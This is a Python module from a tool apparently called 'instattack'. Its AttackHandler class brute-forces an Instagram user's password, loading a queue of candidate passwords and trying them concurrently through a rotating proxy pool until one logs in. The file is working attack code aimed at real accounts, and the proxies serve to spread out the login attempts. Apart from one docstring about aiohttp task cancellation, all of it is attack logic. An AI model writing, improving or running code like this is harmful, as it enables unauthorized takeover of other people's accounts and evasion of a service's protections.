import asyncio
import aiohttp

from instattack.config import config

from instattack.lib.utils import percentage, limit_as_completed

from instattack.app.exceptions import NoPasswordsError
from instattack.app.models import InstagramResults
from instattack.app.proxies import AdvancedProxyPool

from .proxies import BrokeredProxyHandler
from .login import AbstractLoginHandler

"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""

__all__ = (
    'AttackHandler',
)


class AttackHandler(AbstractLoginHandler):

    __name__ = 'Attack Handler'
    __proxy_handler__ = BrokeredProxyHandler
    __proxy_pool__ = AdvancedProxyPool

    def __init__(self, *args, **kwargs):
        super(AttackHandler, self).__init__(*args, **kwargs)

        self.passwords = asyncio.Queue()
        self.num_passwords = 0

    async def attack(self, limit=None):
        try:
            results = await asyncio.gather(
                self._attack(limit=limit),
                self.proxy_handler.run(),
            )
        except Exception as e:
            await self.finish()
            await self.proxy_handler.stop()
            raise e
        else:
            # We might not need to stop proxy handler?
            await self.proxy_handler.stop()
            return results[0]

    async def _attack(self, limit=None):
        await self.prepopulate(limit=limit)
        results = await self.login()
        await self.finish()
        return results

    async def prepopulate(self, limit=None):
        log = self.create_logger('prepopulate')

        message = f'Generating All Attempts for User {self.user.username}.'
        if limit:
            message = (
                f'Generating {limit} '
                f'Attempts for User {self.user.username}.'
            )
        await log.start(message)

        passwords = await self.user.get_new_attempts(self.loop, limit=limit)
        if len(passwords) == 0:
            raise NoPasswordsError()

        self.num_passwords = len(passwords)
        for password in passwords:
            await self.passwords.put(password)

        await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")

    async def login(self):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        log = self.create_logger('login')

        cookies = await self.cookies()
        await self.start_event.wait()

        async with aiohttp.ClientSession(
            connector=self.connector,
            cookies=cookies,
            timeout=self.timeout,
        ) as session:

            results = InstagramResults(results=[])

            async for (result, num_tries), current_attempts, current_tasks in limit_as_completed(
                coros=self.generate_attempts_for_passwords(session),
                batch_size=config['passwords']['batch_size'],
                stop_event=self.stop_event
            ):
                if result.conclusive:
                    self.num_completed += 1
                    results.add(result)

                    pct = percentage(self.num_completed, self.num_passwords)
                    await log.info(f'{pct}', extra={
                        'other': f'Num Attempts: {num_tries}',
                        'password': result.password,
                    })
                    await self.handle_attempt(result)

                    # TODO: This Causes asyncio.CancelledError
                    # await cancel_remaining_tasks(futures=current_tasks)

                    if result.authorized:
                        self.stop_event.set()
                        break

        await asyncio.sleep(0)
        await self.close_scheduler()

        return results
